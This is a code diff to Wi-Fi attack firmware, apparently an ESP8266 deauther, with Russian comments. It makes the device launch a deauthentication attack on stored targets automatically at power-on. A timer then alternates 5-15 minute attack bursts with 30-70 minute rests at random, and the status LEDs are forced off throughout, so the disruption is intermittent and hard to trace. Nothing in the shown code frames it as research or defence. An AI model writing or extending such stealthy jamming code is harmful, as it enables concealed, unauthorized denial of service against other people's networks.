@@ -53,6 +53,19 @@ uint32_t currentTime  = 0;
 
 bool booted = false;
 
+// --- ПЕРЕМЕННЫЕ ХАОТИЧНОГО ТАЙМЕРА (5-15 / 30-70 МИНУТ) ---
+unsigned long deauthPreviousMillis = 0;
+unsigned long currentInterval = 300000; // Стартуем с 5 минут
+bool attackState = true;                // true - атака включена, false - отдых
+
+// Константы времени в миллисекундах (1 минута = 60000 мс)
+const long minAttackTime = 300000;      // Минимальная атака: 5 минут
+const long maxAttackTime = 900000;      // Максимальная атака: 15 минут
+
+const long minRestTime = 1800000;      // Минимальный отдых: 30 минут
+const long maxRestTime = 4200000;      // Максимальный отдых: 70 минут
+// ---------------------------------------------------------
+
 void setup() {
     // for random generator
     randomSeed(os_random());
@@ -148,10 +161,37 @@ void setup() {
 
     // setup reset button
     resetButton = new ButtonPullup(RESET_BUTTON);
+    
+    // Принудительный запуск атаки Deauth при старте платы
+    attack.start(0); 
 }
 
 void loop() {
     currentTime = millis();
+
+    // --- МОДУЛЬ АВТОМАТИЧЕСКОГО ХАОТИЧНОГО ТАЙМЕРА ---
+    if (currentTime - deauthPreviousMillis >= currentInterval) {
+        deauthPreviousMillis = currentTime;
+        attackState = !attackState; // Переключаем фазу (атака -> отдых -> атака)
+
+        if (attackState) {
+            // Включаем атаку Deauth на сохраненные в памяти цели
+            attack.start(0); 
+            // Выбираем случайное время следующей атаки от 5 до 15 минут
+            currentInterval = random(minAttackTime, maxAttackTime);
+        } else {
+            // Полностью останавливаем отправку пакетов (интернет восстанавливается)
+            attack.stop();
+            // Выбираем случайное время следующего отдыха от 30 до 70 минут
+            currentInterval = random(minRestTime, maxRestTime);
+        }
+    }
+    // -------------------------------------------------
+
+    // Аппаратное выключение синего светодиода (пин 2) на протяжении всего цикла
+    digitalWrite(2, HIGH); 
+    // Отключение кастомной светодиодной индикации (если применимо)
+    led::setMode(LED_MODE::IDLE);
 
     led::update();   // update LED color
     wifi::update();  // manage access point
